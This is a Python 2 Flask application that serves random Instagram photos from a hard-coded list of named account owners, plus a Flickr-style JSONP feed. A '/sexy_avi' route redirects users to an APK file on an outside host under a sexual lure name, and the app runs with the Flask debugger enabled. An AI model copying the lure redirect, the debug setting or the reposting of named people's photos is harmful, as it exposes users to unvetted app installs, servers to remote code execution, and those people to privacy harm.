# -*- coding: utf-8 -*-
"""
    Alancer
    ~~~~~~~~

    An application written with Flask and sqlite3.

    :copyright: (c) 2015 by Yi Wei.
    :license: BSD, see LICENSE for more details.
"""
#from gevent import monkey
#monkey.patch_all()
import time, urllib2
from datetime import datetime
from flask import Flask, request, session, url_for, redirect, \
     render_template, abort, g, flash, _app_ctx_stack, make_response
import flask
import models.model_mei as mm
import random
import koji as mcache
import json
app = Flask(__name__)
app.debug = True

GP_INST_OWNER = [
    'djxin_tw',
    'lucycecile',
    '44lucifer77',
    'alicebambam',
    'jenna_chew',
    'actressclara',
    'hwangbarbie',
    'icicbaby',

]
GP_ID_LIST = mm.InstMei.query.filter(mm.InstMei.inst_owner.in_(GP_INST_OWNER)).all()
GP_ID_LIST = [x.id for x in GP_ID_LIST]

def get_mei_count():
    c = mcache.get('MEI_COUNT')
    c = c if c else mm.InstMei.query.count()
    mcache.set('MEI_COUNT', c, 60)
    return c

@app.route('/')
@app.route('/index')
def index():
    MEI_COUNT = get_mei_count()
    #r = [random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT)]
    r = random.sample(GP_ID_LIST, 3)
    ims = mm.InstMei.query.filter(mm.InstMei.id.in_(r)).all()
    return render_template('mei.html', ims=ims, mc=MEI_COUNT)



ANT_RATE = 0.02
@app.route('/query', methods=['POST'])
def query():
    MEI_COUNT = get_mei_count()
    #ims = mm.InstMei.query.all()
    #ims = random.sample(ims, 3)
    #r = [random.randint(1, MEI_COUNT), random.randint(1, MEI_COUNT)]
    r = random.sample(GP_ID_LIST, 2)
    ims = mm.InstMei.query.filter(mm.InstMei.id.in_(r)).all()
    ant = False if random.random() > ANT_RATE else True
    return render_template('mei_query.html', ims=ims, ant=ant)


@app.route('/api')
def api():
    return "https://ig-s-b-a.akamaihd.net/hphotos-ak-xta1/t51.2885-15/e35/17265902_267101913747541_3627374961242406912_n.jpg"


@app.route('/recent')
def recent():
    MEI_COUNT = get_mei_count()
    total = 1000
    #s = [random.randint(1, MEI_COUNT) for i in xrange(total)]
    s = random.sample(GP_ID_LIST, 1000)
    ims = mm.InstMei.query.filter(mm.InstMei.id.in_(s)).all()
    ims = [i.to_dict() for i in ims]
    r = {}
    r['photos'] = {}
    r['photos']['page'] = 1
    r['photos']['pages'] = 4
    r['photos']['perpage'] = 300
    r['photos']['total'] = total
    r['photos']['photo'] = ims
    r['stat'] = 'ok'
    x = json.dumps(r)
    return 'jsonFlickrApi(%s)' % x 


@app.route('/sexy_avi')
def avi():
    return redirect('http://ac-9dv47dhd.clouddn.com/dafa5ee7fe1344b2f387.apk', code=302)
